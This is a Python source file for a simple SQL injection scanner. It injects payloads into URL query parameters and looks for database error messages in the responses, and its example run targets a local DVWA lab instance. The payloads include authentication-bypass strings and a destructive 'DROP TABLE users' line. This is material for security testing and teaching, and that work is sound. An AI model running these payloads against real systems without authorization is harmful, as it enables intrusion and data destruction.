import time
import re
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# ---------------------------
# SQL Injection Payloads
# ---------------------------
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "'; DROP TABLE users; --",   # ⚠️ destructive! only for lab use
]

# Common SQL error message fragments
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "ORA-00933", "ORA-00936", "ORA-00921", "ORA-01756",
    "SQLSTATE[HY000]",
    "ODBC SQL Server Driver"
]

ERROR_PATTERNS = [re.compile(err, re.IGNORECASE) for err in SQL_ERRORS]


# ---------------------------
# Utility functions
# ---------------------------
def get_session():
    """Returns a configured requests session with common headers."""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "SQLi-Scanner/1.0"
    })
    return session


def extract_params(url):
    """Extracts query params from a URL as a dict."""
    parsed = urlparse(url)
    return parse_qs(parsed.query)


def rebuild_url(parsed, params):
    """Rebuilds URL with modified query params."""
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def find_sql_errors(html):
    """Scans response for SQL error patterns."""
    for pattern in ERROR_PATTERNS:
        if pattern.search(html):
            return True, pattern.pattern
    return False, None


# ---------------------------
# Scanner Class
# ---------------------------
class SQLiScanner:
    def __init__(self, base_url, cookies=None, timeout=5):
        self.base_url = base_url
        self.session = get_session()
        if cookies:
            self.session.cookies.update(cookies)
        self.timeout = timeout
        self.findings = []

    def test_params(self, url):
        """Injects SQLi payloads into query params and checks response."""
        parsed = urlparse(url)
        params = extract_params(url)

        if not params:
            return  # No query parameters

        for param in params:
            for payload in SQL_PAYLOADS:
                test_params = params.copy()
                test_params[param] = payload

                test_url = rebuild_url(parsed, test_params)

                try:
                    res = self.session.get(test_url, timeout=self.timeout)
                    body = res.text

                    found, evidence = find_sql_errors(body)
                    if found:
                        self.findings.append({
                            "type": "SQL Injection",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": evidence
                        })
                        print(f"[+] SQLi found! {param} -> {payload}")
                        break

                except requests.RequestException:
                    pass

                time.sleep(0.1)  # avoid flooding

    def run(self):
        print(f"[*] Starting SQL Injection scan on {self.base_url}")
        self.test_params(self.base_url)
        return self.findings


# ---------------------------
# Example Usage (DVWA)
# ---------------------------
if __name__ == "__main__":
    # Example: SQLi in DVWA
    target_url = "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"

    # Update with your DVWA session cookies
    cookies = {
        "PHPSESSID": "your_session_id_here",
        "security": "low"
    }

    scanner = SQLiScanner(target_url, cookies=cookies)
    results = scanner.run()

    print("\n--- Scan Results ---")
    for finding in results:
        print(finding)
